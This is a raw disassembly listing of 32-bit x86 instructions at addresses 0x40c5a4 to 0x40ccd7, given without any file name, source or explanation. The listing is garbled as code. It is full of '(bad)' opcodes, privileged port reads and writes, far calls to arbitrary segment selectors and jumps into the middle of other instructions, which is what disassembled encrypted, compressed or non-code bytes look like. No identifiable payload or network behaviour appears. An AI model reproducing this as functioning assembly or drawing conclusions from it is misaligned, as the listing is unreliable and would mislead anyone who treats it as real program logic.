  40c5a4:	adc    BYTE PTR [esp+eiz*8+0x52d820ac],dl
  40c5ab:	mov    eax,0x732502f9
  40c5b0:	call   0x7d41:0x26101f3d
  40c5b7:	cmp    dl,ch
  40c5b9:	pop    ds
  40c5ba:	push   0x3b
  40c5bc:	cmp    eax,0x86cc814
  40c5c1:	mov    al,0xdb
  40c5c3:	adc    al,0x21
  40c5c5:	push   edi
  40c5c6:	jno    0x40c643
  40c5c8:	ins    DWORD PTR es:[edi],dx
  40c5c9:	mov    edi,edx
  40c5cb:	mov    ds:0xcaa45117,eax
  40c5d0:	mov    bh,0x4f
  40c5d2:	aaa    
  40c5d3:	iret   
  40c5d4:	jae    0x40c653
  40c5d6:	dec    esp
  40c5d7:	mov    dh,0x37
  40c5d9:	mov    dh,0x49
  40c5db:	scas   eax,DWORD PTR es:[edi]
  40c5dc:	arpl   WORD PTR [esi+edi*8-0x41a7ad15],bx
  40c5e3:	repz in eax,dx
  40c5e5:	mov    edi,0x7cccf7cd
  40c5ea:	cdq    
  40c5eb:	ja     0x40c621
  40c5ed:	test   BYTE PTR [ebx+0x4b],0xe
  40c5f1:	pop    ss
  40c5f2:	add    BYTE PTR [esi],cl
  40c5f4:	ret    
  40c5f5:	adc    al,0xfd
  40c5f7:	dec    edx
  40c5f8:	imul   esp,DWORD PTR [edi+0xb],0xd6c81fc7
  40c5ff:	idiv   DWORD PTR [ecx+0x3b]
  40c602:	pop    esp
  40c603:	popa   
  40c604:	ss cmp eax,0x4a31b320
  40c60a:	cmp    eax,0x78ec9919
  40c60f:	lods   al,BYTE PTR ds:[esi]
  40c610:	scas   eax,DWORD PTR es:[edi]
  40c611:	lock push edx
  40c613:	test   BYTE PTR [eax-0x23],ah
  40c616:	add    ah,al
  40c618:	cwde   
  40c619:	imul   esp
  40c61b:	sub    al,0x4f
  40c61d:	mov    al,ds:0xe3e25864
  40c622:	int    0x71
  40c624:	adc    BYTE PTR [eax-0x16],cl
  40c627:	mov    ds:0x9bb4e908,al
  40c62c:	std    
  40c62d:	xchg   edx,eax
  40c62e:	or     BYTE PTR [eax+0x2b118ce6],bl
  40c634:	pop    es
  40c635:	add    esi,DWORD PTR [ebp-0x76edb828]
  40c63b:	inc    ebx
  40c63c:	jns    0x40c688
  40c63e:	pop    es
  40c63f:	mov    ebx,0xa2b85c91
  40c644:	pop    ecx
  40c645:	lock shr ah,0x99
  40c649:	mov    edi,0x7dfcdef6
  40c64e:	adc    DWORD PTR [ebp-0x6d],edi
  40c651:	sbb    esi,DWORD PTR [ebx+0x29]
  40c654:	mov    edx,0x82ea43ca
  40c659:	cmp    al,0x97
  40c65b:	push   esp
  40c65c:	mov    ebx,ebx
  40c65e:	hlt    
  40c65f:	pop    edx
  40c660:	dec    edx
  40c661:	fdiv   DWORD PTR [edx+0x4b6efb50]
  40c667:	mov    ecx,0x8dc2830d
  40c66c:	mov    ds:0x170339dc,eax
  40c671:	ins    BYTE PTR es:[edi],dx
  40c672:	loope  0x40c6f2
  40c674:	fcmove st,st(3)
  40c676:	adc    BYTE PTR [edi+eax*4+0x35],dl
  40c67a:	and    ch,bl
  40c67c:	lahf   
  40c67d:	push   esi
  40c67e:	imul   edi,DWORD PTR [ebp+0x46],0x3e
  40c682:	psubusb mm4,QWORD PTR [ebx]
  40c685:	xchg   DWORD PTR [ecx-0x7b],ebx
  40c688:	inc    ecx
  40c689:	pop    ebp
  40c68a:	scas   al,BYTE PTR es:[edi]
  40c68b:	lea    ecx,[eax+eiz*4-0xb60753]
  40c692:	mov    dl,0x32
  40c694:	push   edx
  40c695:	(bad)  
  40c696:	cmp    eax,0x27af9a67
  40c69b:	mov    ds:0x48ec5bf1,al
  40c6a0:	or     BYTE PTR [esi+0x20],dh
  40c6a3:	or     BYTE PTR [esi+0x264e674c],ah
  40c6a9:	ins    DWORD PTR es:[edi],dx
  40c6aa:	popa   
  40c6ab:	mov    al,ds:0x2539e299
  40c6b0:	xor    eax,0x3216d7ca
  40c6b5:	xchg   BYTE PTR [edi+eiz*1],cl
  40c6b8:	ficom  DWORD PTR [ecx+0x0]
  40c6bb:	data16 mov bh,0x43
  40c6be:	in     al,0x8e
  40c6c0:	push   esi
  40c6c1:	add    BYTE PTR [ebp+0x33],0xc2
  40c6c5:	inc    eax
  40c6c6:	out    dx,eax
  40c6c7:	popf   
  40c6c8:	jbe    0x40c6ab
  40c6ca:	inc    esp
  40c6cb:	sbb    ebx,DWORD PTR [eax]
  40c6cd:	mov    ah,0xeb
  40c6cf:	cdq    
  40c6d0:	ja     0x40c708
  40c6d2:	cmp    bl,BYTE PTR [ecx+0x4009dbf2]
  40c6d8:	lock push edi
  40c6da:	xchg   ecx,eax
  40c6db:	(bad)  
  40c6dc:	mov    ebp,0x6e85b168
  40c6e1:	or     eax,0x21efb330
  40c6e6:	pusha  
  40c6e7:	cs out 0x22,al
  40c6ea:	adc    DWORD PTR ds:[eax-0x56],0x9b4eb8f6
  40c6f2:	and    eax,0x88ef6806
  40c6f7:	fptan  
  40c6f9:	add    ch,bh
  40c6fb:	jnp    0x40c6ec
  40c6fd:	mov    esp,0xb665619c
  40c702:	aam    0xf9
  40c704:	in     eax,0x52
  40c706:	pushf  
  40c707:	mov    ds:0xe2f6c2a4,al
  40c70c:	or     dh,BYTE PTR cs:[edx+0x7b]
  40c710:	out    dx,al
  40c711:	nop
  40c712:	fadd   DWORD PTR [edx+0x4899e76]
  40c718:	int    0x93
  40c71a:	cs mov dl,0x52
  40c71d:	mov    ecx,0x391fb254
  40c722:	lock pop edi
  40c724:	push   edx
  40c725:	cmp    al,0xe1
  40c727:	mov    ecx,0xba0beb3c
  40c72c:	out    dx,al
  40c72d:	jmp    0x40c713
  40c72f:	aas    
  40c730:	out    0xb8,al
  40c732:	lea    eax,[eax-0x79]
  40c735:	push   DWORD PTR ds:0xcb457218
  40c73b:	lock adc dh,BYTE PTR [edx]
  40c73e:	ins    DWORD PTR es:[edi],dx
  40c73f:	xor    DWORD PTR [ebx+0x24],esp
  40c742:	daa    
  40c743:	ins    DWORD PTR es:[edi],dx
  40c744:	out    0x41,al
  40c746:	jl     0x40c74e
  40c748:	adc    DWORD PTR [edx+ebx*1-0x50],esi
  40c74c:	loop   0x40c780
  40c74e:	in     eax,0x9b
  40c750:	cmp    BYTE PTR [eax],0xe9
  40c753:	adc    BYTE PTR [eax],bl
  40c755:	xor    BYTE PTR [edi-0x35308ed2],dh
  40c75b:	mov    ebx,0x8ce9ee62
  40c760:	mov    ebx,0x6f4c716b
  40c765:	jmp    0x40c728
  40c767:	or     bh,BYTE PTR [esi+0x40]
  40c76a:	sbb    ecx,DWORD PTR [esi-0x37897563]
  40c770:	call   0x29ec7615
  40c775:	jo     0x40c782
  40c777:	pusha  
  40c778:	jnp    0x40c7d9
  40c77a:	daa    
  40c77b:	lods   al,BYTE PTR ds:[esi]
  40c77c:	mov    edx,0x7a7ea87b
  40c781:	out    dx,al
  40c782:	or     ch,BYTE PTR [eax]
  40c784:	std    
  40c785:	dec    BYTE PTR [ebp-0xe]
  40c788:	push   edi
  40c789:	dec    ecx
  40c78a:	push   eax
  40c78b:	push   ebp
  40c78c:	or     al,0xdf
  40c78e:	enter  0x675e,0x16
  40c792:	adc    eax,0x4107cfdb
  40c797:	pop    edx
  40c798:	popf   
  40c799:	repz or ch,dl
  40c79c:	mov    ds:0x41bb1b9b,al
  40c7a1:	adc    eax,0xb884e77c
  40c7a6:	cwde   
  40c7a7:	adc    edi,DWORD PTR [ebp+esi*4+0xade0192]
  40c7ae:	dec    edi
  40c7af:	pop    ebp
  40c7b0:	push   ds
  40c7b1:	pop    esi
  40c7b2:	scas   al,BYTE PTR es:[edi]
  40c7b3:	sbb    eax,0xa21dc081
  40c7b8:	(bad)  
  40c7b9:	cmp    al,0x53
  40c7bb:	sub    BYTE PTR [edi],0x44
  40c7be:	dec    ecx
  40c7bf:	mov    ch,0x33
  40c7c1:	mov    ah,0x8f
  40c7c3:	sub    al,0xd5
  40c7c5:	inc    edx
  40c7c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7c7:	lahf   
  40c7c8:	imul   edi,esp,0x61a2f68c
  40c7ce:	push   ebx
  40c7cf:	cmp    dl,BYTE PTR [esi-0x126640a7]
  40c7d5:	cdq    
  40c7d6:	pop    es
  40c7d7:	xor    BYTE PTR [edi+ecx*4-0x5f],cl
  40c7db:	sbb    al,0x97
  40c7dd:	sbb    esp,esp
  40c7df:	rol    BYTE PTR [esi+0x6a],cl
  40c7e2:	inc    esi
  40c7e3:	xor    DWORD PTR [eax],eax
  40c7e5:	(bad)  
  40c7e6:	jl     0x40c7ef
  40c7e8:	jge    0x40c84c
  40c7ea:	mov    eax,ds:0x5367e7f1
  40c7ef:	lods   al,BYTE PTR ds:[esi]
  40c7f0:	jne    0x40c7a9
  40c7f2:	ss inc ebx
  40c7f4:	dec    edx
  40c7f5:	mov    bh,BYTE PTR [eax+0x65fe333a]
  40c7fb:	adc    ch,al
  40c7fd:	add    bh,dl
  40c7ff:	sbb    BYTE PTR [edi],al
  40c801:	inc    esi
  40c802:	add    DWORD PTR [ecx],ebx
  40c804:	push   ds
  40c805:	and    DWORD PTR [esp+ebx*4-0xe],ebp
  40c809:	and    al,0xeb
  40c80b:	scas   al,BYTE PTR es:[edi]
  40c80c:	and    eax,0xef7fb65e
  40c811:	call   0xb31a:0xa47e15a6
  40c818:	rcr    DWORD PTR [ebp+0x50],cl
  40c81b:	mov    ds:0x9f1fdb5,eax
  40c820:	pop    edx
  40c821:	rcr    BYTE PTR [esi+edi*8+0xa0081db],1
  40c828:	or     eax,0xb061f6e
  40c82d:	xor    BYTE PTR [edx-0x234118fd],ah
  40c833:	popa   
  40c834:	xchg   edi,eax
  40c835:	daa    
  40c836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c837:	mov    ah,0x8d
  40c839:	adc    eax,0x53e93bfe
  40c83e:	dec    edi
  40c83f:	fist   WORD PTR [ebx+eiz*1+0x40]
  40c843:	clc    
  40c844:	(bad)  
  40c845:	shr    DWORD PTR [ebp-0x41],cl
  40c848:	test   BYTE PTR [ebx-0x42c27bdc],0xaf
  40c84f:	mov    WORD PTR [esi],fs
  40c851:	or     al,0xbf
  40c853:	loopne 0x40c878
  40c855:	jl     0x40c7f6
  40c857:	mov    cl,0xb4
  40c859:	inc    ebx
  40c85a:	mov    dh,0xc0
  40c85c:	lea    eax,[ebp+0x33add2b0]
  40c862:	mov    edx,0x33afcfc3
  40c867:	pop    ecx
  40c868:	pop    edi
  40c869:	xchg   esp,eax
  40c86a:	ja     0x40c8c0
  40c86c:	or     bl,0x87
  40c86f:	inc    edx
  40c870:	cmc    
  40c871:	dec    edi
  40c872:	js     0x40c855
  40c874:	or     BYTE PTR [esp+esi*4+0x4b],ch
  40c878:	pop    ss
  40c879:	pop    ebp
  40c87a:	(bad)  
  40c87b:	hlt    
  40c87c:	scas   al,BYTE PTR es:[edi]
  40c87d:	jnp    0x40c8aa
  40c87f:	cwde   
  40c880:	push   0x9ed64661
  40c885:	call   0xe4d9d4ee
  40c88a:	xchg   esp,eax
  40c88b:	fcom   st(2)
  40c88d:	and    eax,eax
  40c88f:	mov    DWORD PTR [ecx+0x48],edi
  40c892:	xchg   BYTE PTR ds:0x43acc747,ah
  40c898:	inc    ebx
  40c899:	test   DWORD PTR [esi-0x1ada0691],esi
  40c89f:	sbb    eax,0x741c8f01
  40c8a4:	push   0x59
  40c8a6:	or     eax,0xaf131f68
  40c8ab:	mov    al,0xc9
  40c8ad:	pop    edi
  40c8ae:	mov    al,ds:0x5cfc8b90
  40c8b3:	jb     0x40c875
  40c8b5:	pop    es
  40c8b6:	dec    ebx
  40c8b7:	fs (bad) 
  40c8b9:	push   ds
  40c8ba:	ficom  WORD PTR [ecx]
  40c8bc:	add    al,0x2f
  40c8be:	popa   
  40c8bf:	xor    bl,dh
  40c8c1:	xor    al,0x2a
  40c8c3:	xchg   ecx,eax
  40c8c4:	push   esi
  40c8c5:	jbe    0x40c8bd
  40c8c7:	jne    0x40c866
  40c8c9:	out    0xce,al
  40c8cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8cc:	adc    dl,ah
  40c8ce:	jecxz  0x40c8c3
  40c8d0:	sub    esi,DWORD PTR [edi+edx*1+0x28]
  40c8d4:	int3   
  40c8d5:	adc    BYTE PTR [esp+ebx*2],cl
  40c8d8:	xor    DWORD PTR es:[eax+eax*4],ebp
  40c8dc:	and    eax,0xf8b85abb
  40c8e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e2:	cmp    al,0x98
  40c8e4:	xchg   esi,eax
  40c8e5:	lods   eax,DWORD PTR ds:[esi]
  40c8e6:	fs (bad) 
  40c8e8:	outs   dx,DWORD PTR ds:[esi]
  40c8e9:	scas   al,BYTE PTR es:[edi]
  40c8ea:	pusha  
  40c8eb:	lods   eax,DWORD PTR ds:[esi]
  40c8ec:	cwde   
  40c8ed:	ror    cl,cl
  40c8ef:	xor    BYTE PTR [ebp-0xf],dh
  40c8f2:	inc    esi
  40c8f3:	jge    0x40c968
  40c8f5:	add    DWORD PTR [eax],edi
  40c8f7:	jmp    0x2be4:0xdcc45988
  40c8fe:	cmp    al,0xcf
  40c900:	xor    BYTE PTR [ebp-0x7],al
  40c903:	lods   eax,DWORD PTR ds:[esi]
  40c904:	je     0x40c923
  40c906:	mov    ecx,0x7f9a4610
  40c90b:	(bad)  
  40c90c:	mov    dh,0x10
  40c90e:	sti    
  40c90f:	pop    esp
  40c910:	xor    eax,0x5af69a96
  40c915:	sub    ecx,ecx
  40c917:	add    DWORD PTR [bp+si-0x3e],ebx
  40c91b:	dec    eax
  40c91c:	jecxz  0x40c8b8
  40c91e:	push   eax
  40c91f:	out    0xd8,eax
  40c921:	hlt    
  40c922:	jns    0x40c956
  40c924:	sbb    ch,BYTE PTR [ecx-0x5159995a]
  40c92a:	inc    edx
  40c92b:	push   0x6d5d850a
  40c930:	xchg   esp,eax
  40c931:	addr16 pop ebp
  40c933:	inc    edx
  40c934:	mov    ds:0xa6b2d04a,al
  40c939:	pop    esp
  40c93a:	int    0x78
  40c93c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c93d:	push   ss
  40c93e:	dec    esp
  40c93f:	out    dx,al
  40c940:	leave  
  40c941:	inc    ecx
  40c942:	lods   eax,DWORD PTR ds:[esi]
  40c943:	inc    eax
  40c944:	lock jae 0x40c9a3
  40c947:	jg     0x40c922
  40c949:	sbb    DWORD PTR [ecx],0x6df0b69f
  40c94f:	xchg   esi,eax
  40c950:	not    DWORD PTR [edx-0x483b8855]
  40c956:	lock jbe 0x40c962
  40c959:	jb     0x40c95c
  40c95b:	mov    bl,dh
  40c95d:	lods   al,BYTE PTR ds:[esi]
  40c95e:	sbb    eax,ebx
  40c960:	(bad)  
  40c962:	mov    al,dh
  40c964:	leave  
  40c965:	hlt    
  40c966:	add    al,0x75
  40c968:	pushf  
  40c969:	fld    QWORD PTR ds:0x7cbd96d5
  40c96f:	loop   0x40c9a8
  40c971:	pop    esi
  40c972:	mov    ds:0x29054d82,eax
  40c977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c978:	mov    bl,0x1f
  40c97a:	in     al,dx
  40c97b:	xor    BYTE PTR [eax],dl
  40c97d:	add    dl,BYTE PTR [edi]
  40c97f:	inc    edx
  40c980:	inc    esp
  40c981:	dec    edi
  40c982:	icebp  
  40c983:	push   ds
  40c984:	(bad)  
  40c985:	fcom   DWORD PTR [eax-0x2cf8efee]
  40c98b:	sbb    esp,ebx
  40c98d:	and    ebp,DWORD PTR [ebx-0x5b]
  40c990:	fbstp  TBYTE PTR [eax+0x6a30486c]
  40c996:	in     eax,0xa9
  40c998:	mov    eax,0x8fe6c63c
  40c99d:	inc    ecx
  40c99e:	jle    0x40c94e
  40c9a0:	fwait
  40c9a1:	mov    edx,0xc3ff5def
  40c9a6:	xchg   edx,eax
  40c9a7:	not    BYTE PTR [edi+0xcadd5d8]
  40c9ad:	xor    ah,dl
  40c9af:	xlat   BYTE PTR ds:[ebx]
  40c9b0:	lock fisttp DWORD PTR [edi+edx*2+0x4f]
  40c9b5:	mov    cl,0xf4
  40c9b7:	adc    ah,dh
  40c9b9:	mov    eax,0xea8bdbae
  40c9be:	cmp    DWORD PTR [esi+eax*8+0x7a],ebp
  40c9c2:	aaa    
  40c9c3:	dec    esi
  40c9c4:	jge    0x40c99a
  40c9c6:	cmp    al,0xf6
  40c9c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9c9:	fcomp  DWORD PTR [edx]
  40c9cb:	cli    
  40c9cc:	and    al,0x30
  40c9ce:	cmp    BYTE PTR [esi-0x5546ed76],ah
  40c9d4:	pushf  
  40c9d5:	in     eax,dx
  40c9d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9d7:	dec    eax
  40c9d8:	stos   DWORD PTR es:[edi],eax
  40c9d9:	fsubr  QWORD PTR [eax]
  40c9db:	sti    
  40c9dc:	test   eax,0xbdf4feda
  40c9e1:	(bad)  
  40c9e2:	stos   DWORD PTR es:[edi],eax
  40c9e3:	xchg   esp,eax
  40c9e4:	jg     0x40c9c5
  40c9e6:	das    
  40c9e7:	cwde   
  40c9e8:	fstp   DWORD PTR [ebx+eiz*8-0x6c7cbd86]
  40c9ef:	iret   
  40c9f0:	sti    
  40c9f1:	rol    dl,1
  40c9f3:	xchg   ebx,eax
  40c9f4:	loop   0x40c9ac
  40c9f6:	xchg   ebx,eax
  40c9f7:	xor    eax,0xf358392
  40c9fc:	and    eax,0xd38d71d9
  40ca01:	pop    edx
  40ca02:	repz call 0xd25e:0xfb6cc25c
  40ca0a:	iret   
  40ca0b:	pop    ecx
  40ca0c:	rcl    DWORD PTR [edi-0x36],cl
  40ca0f:	mov    ch,0xac
  40ca11:	ror    BYTE PTR [ebx+eiz*4],cl
  40ca14:	pop    ss
  40ca15:	sub    ah,dh
  40ca17:	sub    DWORD PTR [eax],edi
  40ca19:	cmp    BYTE PTR [eax],ch
  40ca1b:	dec    esp
  40ca1c:	scas   al,BYTE PTR es:[edi]
  40ca1d:	push   0xffffffbd
  40ca1f:	or     bl,ch
  40ca21:	out    0xae,al
  40ca23:	bound  esi,QWORD PTR [ecx+0x6e]
  40ca26:	mov    BYTE PTR [ebx-0x163c6cf8],ah
  40ca2c:	mov    ds:0x4da75684,eax
  40ca31:	into   
  40ca32:	or     bh,ch
  40ca34:	inc    esp
  40ca35:	adc    dl,BYTE PTR [ecx]
  40ca37:	mov    ch,0xa9
  40ca39:	int    0x0
  40ca3b:	std    
  40ca3c:	adc    al,0xbb
  40ca3e:	xchg   bl,bl
  40ca40:	or     al,0xae
  40ca42:	mul    DWORD PTR [ebp+0x21c671f2]
  40ca48:	add    al,BYTE PTR [esi+eiz*4-0x5946e5f]
  40ca4f:	mov    bl,0x9
  40ca51:	pushf  
  40ca52:	jb     0x40ca2d
  40ca54:	nop
  40ca55:	fs xor al,0x7a
  40ca58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca59:	xchg   esi,eax
  40ca5a:	xchg   edx,eax
  40ca5b:	test   BYTE PTR [edi],al
  40ca5d:	mov    dl,0xf1
  40ca5f:	iret   
  40ca60:	fstp   QWORD PTR [ecx-0x66]
  40ca63:	inc    edi
  40ca64:	and    al,0xff
  40ca66:	xor    esp,ebx
  40ca68:	pop    eax
  40ca69:	add    eax,ebp
  40ca6b:	iret   
  40ca6c:	or     esi,esp
  40ca6e:	fnstenv [edi]
  40ca70:	cs add al,0x2e
  40ca73:	mov    ds:0x1449a7a1,al
  40ca78:	gs sbb eax,0x1c3eb72c
  40ca7e:	adc    eax,0x3a3fe91e
  40ca83:	jmp    0x278b:0x1e14b871
  40ca8a:	xor    ecx,DWORD PTR [esi+0x5a21b3a5]
  40ca90:	adc    eax,0xe2ce0e7a
  40ca95:	icebp  
  40ca96:	(bad)  
  40ca97:	cwde   
  40ca98:	jge    0x40ca71
  40ca9a:	add    BYTE PTR [ebp+0x56ee5bf5],0xa0
  40caa1:	ds pop esp
  40caa3:	mov    al,bh
  40caa5:	xor    eax,0x77fdae1a
  40caaa:	cmp    bh,BYTE PTR [esi]
  40caac:	shl    DWORD PTR [ecx-0xa],1
  40caaf:	sbb    cl,ch
  40cab1:	ret    0xaf4f
  40cab4:	jecxz  0x40ca38
  40cab6:	in     eax,dx
  40cab7:	mov    eax,ds:0xce7e0d9c
  40cabc:	(bad)  
  40cabe:	stos   BYTE PTR es:[edi],al
  40cabf:	push   ss
  40cac0:	add    BYTE PTR [esi+edx*1],ah
  40cac3:	(bad)  
  40cac4:	sub    bl,dl
  40cac6:	adc    esp,DWORD PTR [ebp-0x5b]
  40cac9:	nop
  40caca:	mov    ecx,?
  40cacc:	inc    esi
  40cacd:	(bad)  
  40cacf:	stos   DWORD PTR es:[edi],eax
  40cad0:	es jnp 0x40cab0
  40cad3:	cmp    eax,0xdd45eea5
  40cad8:	ja     0x40ca84
  40cada:	mov    esp,0xc2033516
  40cadf:	fs jnp 0x40ca7a
  40cae2:	mov    al,0x84
  40cae4:	out    dx,eax
  40cae5:	dec    edi
  40cae6:	jmp    DWORD PTR [edx-0x4e11945c]
  40caec:	jl     0x40cb46
  40caee:	iret   
  40caef:	test   BYTE PTR [eax],0x51
  40caf2:	sub    al,0x68
  40caf4:	pop    esp
  40caf5:	outs   dx,BYTE PTR ds:[esi]
  40caf6:	sub    BYTE PTR [edi-0x4c],0x1d
  40cafa:	mov    bl,0x5c
  40cafc:	xor    al,0xfe
  40cafe:	outs   dx,DWORD PTR ds:[esi]
  40caff:	std    
  40cb00:	mov    esi,0xbaae62fa
  40cb06:	mov    esp,ebx
  40cb08:	mov    cl,0xff
  40cb0a:	jne    0x40cafd
  40cb0c:	cmp    DWORD PTR [ecx-0x3a],ecx
  40cb0f:	push   ebp
  40cb10:	adc    bl,bh
  40cb12:	stos   DWORD PTR es:[edi],eax
  40cb13:	cmp    eax,0x1303e682
  40cb18:	or     eax,0xda3ed0
  40cb1d:	cwde   
  40cb1e:	jg     0x40cb49
  40cb20:	pusha  
  40cb21:	jmp    0x40cb8e
  40cb23:	mov    dl,dl
  40cb25:	inc    ecx
  40cb26:	xlat   BYTE PTR fs:[ebx]
  40cb28:	push   esi
  40cb29:	cmc    
  40cb2a:	jns    0x40cb4a
  40cb2c:	push   es
  40cb2d:	lods   eax,DWORD PTR ds:[esi]
  40cb2e:	mov    dh,0xf4
  40cb30:	imul   edi,DWORD PTR [ebp+0x68150d33],0x4a3a3a12
  40cb3a:	add    al,0xc6
  40cb3c:	push   ss
  40cb3d:	mov    al,0x7d
  40cb3f:	rcl    DWORD PTR [esi],1
  40cb41:	daa    
  40cb42:	pop    ss
  40cb43:	lds    ecx,FWORD PTR [eax]
  40cb45:	shl    DWORD PTR [eax],cl
  40cb47:	jge    0x40cbae
  40cb49:	popa   
  40cb4a:	arpl   bp,bx
  40cb4c:	icebp  
  40cb4d:	in     al,dx
  40cb4e:	and    DWORD PTR [esi-0x42],0x7ee206b3
  40cb55:	push   edi
  40cb56:	push   ebp
  40cb57:	ds mov bh,cl
  40cb5a:	jno    0x40caeb
  40cb5c:	and    eax,0xdb45c676
  40cb61:	mov    ah,0x96
  40cb63:	jno    0x40cb11
  40cb65:	jae    0x40cb83
  40cb67:	push   ss
  40cb68:	in     eax,dx
  40cb69:	fwait
  40cb6a:	loop   0x40cbe5
  40cb6c:	cwde   
  40cb6d:	mov    bl,0x9d
  40cb6f:	enter  0x7e3c,0xa
  40cb73:	out    0xc4,al
  40cb75:	div    BYTE PTR [edi]
  40cb77:	dec    esi
  40cb78:	cwde   
  40cb79:	sub    eax,DWORD PTR [ebx+esi*4]
  40cb7c:	and    eax,0x87a8519f
  40cb81:	inc    ecx
  40cb82:	pop    ds
  40cb83:	jae    0x40cb2a
  40cb85:	adc    DWORD PTR [edx-0x3f],esp
  40cb88:	fld    QWORD PTR [edx-0x18]
  40cb8b:	test   BYTE PTR [eax*4-0x6842f957],al
  40cb92:	gs or  eax,0x10d1895e
  40cb99:	cmp    eax,ebp
  40cb9b:	push   esp
  40cb9c:	mov    bl,0x51
  40cb9e:	jl     0x40cb2b
  40cba0:	push   esp
  40cba1:	cdq    
  40cba2:	outs   dx,DWORD PTR ds:[esi]
  40cba3:	fs push 0x55
  40cba6:	cs dec ebx
  40cba8:	jle    0x40cbfc
  40cbaa:	ja     0x40cbbc
  40cbac:	or     DWORD PTR [eax],ecx
  40cbae:	mov    ebp,0x45135f62
  40cbb3:	inc    ebp
  40cbb4:	aam    0x48
  40cbb6:	inc    edi
  40cbb7:	mov    ch,0x69
  40cbb9:	sbb    BYTE PTR [edi-0x42],0x3f
  40cbbd:	xchg   esp,eax
  40cbbe:	lods   eax,DWORD PTR ds:[esi]
  40cbbf:	dec    edx
  40cbc0:	push   ecx
  40cbc1:	mov    ebx,0x4623c057
  40cbc6:	cmp    BYTE PTR [esi+0x24],bh
  40cbc9:	mov    bx,WORD PTR ss:[ecx+edx*2]
  40cbce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbcf:	bound  esi,QWORD PTR [esi]
  40cbd1:	fs pop esp
  40cbd3:	outs   dx,BYTE PTR ds:[esi]
  40cbd4:	jnp    0x40cb86
  40cbd6:	sub    dh,bh
  40cbd8:	retf   
  40cbd9:	retf   
  40cbda:	loopne 0x40cb99
  40cbdc:	ds test eax,0xbc083223
  40cbe2:	and    eax,0xb05d28d0
  40cbe7:	in     eax,dx
  40cbe8:	push   edx
  40cbe9:	push   0xffffffaa
  40cbeb:	cmp    ebx,edi
  40cbed:	push   ebx
  40cbee:	sbb    DWORD PTR [esi+0x28dfbcca],edi
  40cbf4:	aas    
  40cbf5:	neg    DWORD PTR ds:0xc319b
  40cbfb:	mov    ch,0x2a
  40cbfd:	xlat   BYTE PTR ds:[ebx]
  40cbfe:	daa    
  40cbff:	aaa    
  40cc00:	sub    BYTE PTR [esi],al
  40cc02:	in     al,dx
  40cc03:	outs   dx,BYTE PTR ds:[si]
  40cc05:	cdq    
  40cc06:	xchg   esp,eax
  40cc07:	and    DWORD PTR [ebx-0x262a95a6],edx
  40cc0d:	mov    dl,0xd8
  40cc0f:	popf   
  40cc10:	mov    dh,0x18
  40cc12:	ins    BYTE PTR es:[edi],dx
  40cc13:	and    eax,edx
  40cc15:	add    eax,0x85dc6ed4
  40cc1a:	es inc ebp
  40cc1c:	addr16 fwait
  40cc1e:	test   DWORD PTR [eax],ebp
  40cc20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc21:	popf   
  40cc22:	sbb    eax,0x49a7a24a
  40cc27:	add    BYTE PTR [eax+0xf768dc9],dh
  40cc2d:	xor    eax,0xe6e5f4ad
  40cc32:	jb     0x40cbd4
  40cc34:	leave  
  40cc35:	and    eax,0x6f8d5c2
  40cc3a:	inc    edi
  40cc3b:	ffreep st(3)
  40cc3d:	add    eax,0xebf6227b
  40cc42:	mov    ecx,0xac18dae0
  40cc47:	sub    esp,DWORD PTR [edi-0x77]
  40cc4a:	inc    ecx
  40cc4b:	fs scas al,BYTE PTR es:[edi]
  40cc4d:	mov    bh,0xd2
  40cc4f:	out    dx,al
  40cc50:	stc    
  40cc51:	addr16 push ecx
  40cc53:	pop    ds
  40cc54:	popf   
  40cc55:	cmp    edi,DWORD PTR [edi-0x6d01fb33]
  40cc5b:	pop    ecx
  40cc5c:	mov    ah,BYTE PTR [ebp+0x71]
  40cc5f:	pop    ebp
  40cc60:	and    DWORD PTR [eax-0x70],edx
  40cc63:	sbb    ch,dh
  40cc65:	sbb    al,0x92
  40cc67:	jae    0x40cc34
  40cc69:	std    
  40cc6a:	sbb    ah,ch
  40cc6c:	cs int3 
  40cc6e:	jge    0x40cc0e
  40cc70:	xor    ebp,ecx
  40cc72:	jbe    0x40cc4e
  40cc74:	dec    eax
  40cc75:	or     eax,DWORD PTR [eax]
  40cc77:	mov    dl,0xea
  40cc79:	pop    edi
  40cc7a:	out    0xf4,al
  40cc7c:	neg    BYTE PTR [edx-0x3c]
  40cc7f:	add    cl,ah
  40cc81:	sar    DWORD PTR [ebp-0x58],cl
  40cc84:	xchg   esp,eax
  40cc85:	imul   eax,DWORD PTR [esi-0x6],0xee12213
  40cc8c:	loopne 0x40ccf4
  40cc8e:	push   esp
  40cc8f:	and    BYTE PTR [ebx+edx*4+0x6534341f],bl
  40cc96:	cld    
  40cc97:	test   BYTE PTR [eax+0x1d73d2b9],dh
  40cc9d:	iret   
  40cc9e:	dec    eax
  40cc9f:	and    esi,edi
  40cca1:	jecxz  0x40cc63
  40cca3:	jg     0x40cca1
  40cca5:	cdq    
  40cca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cca7:	sub    ebp,ebp
  40cca9:	test   BYTE PTR [edi],bl
  40ccab:	push   0xdeb8b345
  40ccb0:	mov    ds,edi
  40ccb2:	push   ecx
  40ccb3:	rcl    DWORD PTR [ebx],0xf1
  40ccb6:	int3   
  40ccb7:	scas   al,BYTE PTR es:[edi]
  40ccb8:	mov    ebx,0x5bcd9c5b
  40ccbd:	push   ss
  40ccbe:	or     al,0x1c
  40ccc0:	dec    ecx
  40ccc1:	add    al,0x60
  40ccc3:	jmp    0xcf58a62f
  40ccc8:	dec    DWORD PTR [edx-0x80]
  40cccb:	xchg   BYTE PTR fs:[ecx-0x2a668aa9],ah
  40ccd2:	shl    ch,1
  40ccd4:	out    0x83,eax
  40ccd6:	xchg   esp,eax
  40ccd7:	and    BYTE PTR [esp+eax*2+0x38],0x66
